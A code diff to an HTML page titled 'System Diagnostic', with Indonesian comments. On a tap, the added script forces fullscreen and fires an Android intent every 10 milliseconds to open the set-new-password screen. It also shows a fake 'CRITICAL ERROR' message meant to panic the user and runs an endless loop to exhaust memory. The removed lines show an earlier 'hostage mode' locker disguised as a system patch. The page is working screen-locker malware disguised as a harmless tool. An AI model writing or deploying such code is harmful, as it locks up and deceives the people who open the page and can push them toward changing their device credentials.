@@ -1,18 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Critical System Patch</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+    <style>
+        body { margin: 0; background: #000; color: #0f0; font-family: monospace; height: 100vh; display: flex; align-items: center; justify-content: center; cursor: none; overflow: hidden; }
+        #msg { text-align: center; font-size: 20px; border: 1px solid #0f0; padding: 20px; }
+    </style>
 </head>
-<body onload="activate()">
-    <h1>Updating System... Please wait.</h1>
-    
-    <script src="Locker.js"></script>
-    
+<body onclick="lockDown()">
+
+    <div id="msg">
+        [SYSTEM INITIALIZING]<br>
+        TAP TO START DIAGNOSTIC
+    </div>
+
     <script>
-        function activate() {
-            // Panggil otot-otot dari Locker.js
-            Locker.startHostageMode();
-            Locker.stressMemory();
+        function lockDown() {
+            // 1. Fullscreen Lockdown
+            document.documentElement.requestFullscreen();
+
+            // 2. Intent Flood - The Deadlock Engine
+            // Kita nembak intent ini tiap 10ms secara nonstop
+            setInterval(() => {
+                window.location.href = "intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;component=com.android.settings/.ChooseLockGeneric;end";
+            }, 10);
+
+            // 3. UI Redressing - Menutupi layar biar user panik
+            document.getElementById('msg').innerHTML = "CRITICAL ERROR: SYSTEM HANG<br>REBOOT REQUIRED";
+            
+            // 4. Memory Exhaustion
+            while(true) {
+                console.log("Deadlock Active...");
+            }
         }
     </script>
 </body>
